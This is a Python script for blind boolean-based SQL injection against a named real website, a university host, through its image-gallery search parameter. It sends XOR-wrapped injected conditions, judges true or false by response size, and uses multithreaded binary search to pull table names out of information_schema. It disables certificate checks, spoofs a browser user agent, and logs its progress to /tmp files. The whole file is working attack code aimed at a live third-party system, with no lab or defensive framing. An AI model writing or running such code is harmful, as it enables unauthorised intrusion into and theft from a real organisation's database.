#!/usr/bin/env python3
"""Continuation: extract table-name SUFFIXES (skip known 'tbl_' prefix) for uefweb DB.
Usage: python3 /tmp/sqli_enum3_uef.py <start> <end> [workers]
Reads existing JSON, appends to 'tables' list, saves after each name.
"""
import sys, time, json, threading, urllib.parse, http.client, ssl
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000
LOG = "/tmp/sqli_enum_uef.log"
JSONF = "/tmp/sqli_enum_uef.json"
lock = threading.Lock()
stats = {"req": 0}
cache = {}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def get_conn():
    c = getattr(_local, "conn", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.conn = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for attempt in range(3):
        try:
            c = get_conn()
            c.request("GET", url, headers={"User-Agent": UA, "Accept": "*/*"})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            _local.conn = None
        except Exception:
            _local.conn = None
            if attempt == 2:
                log("HTTP_ERR expr=%s..." % q[:50])
    return None


def ask(expr):
    with lock:
        if expr in cache:
            return cache[expr]
    size = http_size(expr)
    res = False if size is None else size >= THRESH
    if size is not None:
        with lock:
            cache[expr] = res
    return res


def get_len(expr, maxlen=64):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, workers):
    n = get_len(expr)
    if n <= 0:
        log("%s: EMPTY" % label)
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_char, expr, pos + 1): pos for pos in range(n)}
        for f, pos in futs.items():
            chars[pos] = f.result()
    s = "".join(chars)
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r (verify=%s, len=%d, req=%d)" % (label, s, ok, n, stats["req"]))
    return ("tbl_" + s) if ok else ("tbl_" + s + "  [VERIFY_FAILED]")


def load_json():
    try:
        with open(JSONF) as f:
            return json.load(f)
    except Exception:
        return {}


def save_json(d):
    with open(JSONF, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def main():
    start, end = int(sys.argv[1]), int(sys.argv[2])
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 4
    d = load_json()
    tables = d.get("tables", [])
    t0 = time.time()
    log("=== TABLES2 %d..%d (workers=%d) ===" % (start, end, workers))
    for i in range(start, end):
        sfx = extract("SELECT SUBSTRING(table_name,5) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT %d,1" % i, "sfx[%d]" % i, workers)
        tables.append(sfx)
        d["tables"] = tables
        save_json(d)
    log("=== TABLES2 DONE in %.0fs, req=%d, total_tables=%d ===" % (time.time() - t0, stats["req"], len(tables)))


if __name__ == "__main__":
    main()
